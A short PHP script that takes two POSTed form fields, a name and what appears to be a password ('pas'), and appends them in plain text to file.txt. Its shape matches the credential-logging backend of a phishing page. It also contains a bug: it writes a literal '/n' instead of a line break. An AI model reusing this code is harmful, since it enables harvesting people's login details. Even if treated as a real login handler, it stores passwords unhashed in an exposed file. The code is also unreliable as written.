<?php
$handle = fopen("file.txt" , "a");
fwrite($handle, $_POST['name']);
fwrite($handle, " : ");
fwrite($handle, $_POST['pas']);
fwrite($handle, "/n");

?>
